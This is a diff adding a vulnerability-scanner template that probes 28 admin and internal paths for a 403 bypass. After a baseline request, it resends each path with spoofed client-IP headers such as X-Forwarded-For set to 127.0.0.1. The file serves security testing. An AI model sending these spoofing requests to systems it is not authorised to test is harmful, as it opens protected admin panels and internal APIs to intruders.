@@ -1,0 +1,117 @@
+id: 403-bypass-ip-spoofing
+
+info:
+  name: 403 Bypass Via IP Spoofing Headers
+  author: p3i
+  severity: high
+  description: >
+    Tests whether 403 Forbidden responses on admin or sensitive paths can be
+    bypassed by adding IP spoofing headers that trick the server into treating
+    the request as originating from localhost or a trusted internal IP. Common
+    in setups where an application trusts X-Forwarded-For or X-Real-IP to
+    determine the client IP for access controls, rather than the actual TCP
+    source IP. When the web server (nginx, Apache) or load balancer adds these
+    headers based on untrusted client input, an attacker can spoof being 127.0.0.1
+    and bypass IP-based allowlists protecting admin panels and internal APIs.
+    The template sends each path twice — once clean (must return 403) then
+    with spoofed headers — and only matches when the status changes to 2xx.
+  reference:
+    - https://portswigger.net/web-security/access-control/bypassing-ip-based-controls
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema
+  tags: misconfig,403,bypass,ip-spoofing,access-control,admin,web
+  metadata:
+    max-request: 56
+
+http:
+  - raw:
+      # Request 1: baseline — must return 403 to qualify
+      - |
+        GET /{{admin_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      # Request 2: with IP spoofing headers — if 200, bypass confirmed
+      - |
+        GET /{{admin_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        X-Forwarded-For: 127.0.0.1
+        X-Real-IP: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Client-IP: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        Connection: close
+
+    payloads:
+      admin_path:
+        - "admin"
+        - "admin/"
+        - "admin/dashboard"
+        - "admin/users"
+        - "admin/settings"
+        - "api/admin"
+        - "api/admin/"
+        - "api/internal"
+        - "api/private"
+        - "api/management"
+        - "management"
+        - "manage"
+        - "dashboard"
+        - "internal"
+        - "private"
+        - "backend"
+        - "api/v1/admin"
+        - "api/v2/admin"
+        - "api/v1/internal"
+        - "api/v1/management"
+        - "api/v1/users"
+        - "api/v1/system"
+        - "_admin"
+        - "__admin"
+        - "metrics"
+        - "debug"
+        - "health/details"
+        - "status/internal"
+
+    attack: batteringram
+    req-condition: true
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      # Baseline MUST be 403 — otherwise it's a public endpoint, not a bypass
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403"
+
+      # Bypass response must be a success or redirect (meaning access was granted)
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 || status_code_2 == 301 || status_code_2 == 302"
+
+      # The response must have changed — if both are 403, no bypass
+      - type: dsl
+        dsl:
+          - "status_code_1 != status_code_2"
+
+      # Bypass response must not be another auth error (401, 403 disguised as redirect)
+      - type: dsl
+        dsl:
+          - "!contains(tolower(body_2), 'access denied') && !contains(tolower(body_2), 'forbidden') && !contains(tolower(body_2), 'unauthorized')"
+
+    extractors:
+      - type: dsl
+        name: baseline_status
+        dsl:
+          - "status_code_1"
+      - type: dsl
+        name: bypass_status
+        dsl:
+          - "status_code_2"
+      - type: regex
+        part: body_2
+        regex:
+          - "(?i)(<title>[^<]{1,100}</title>|\"version\"\\s*:\\s*\"[^\"]+\"|\"user\"\\s*:\\s*\\{)"
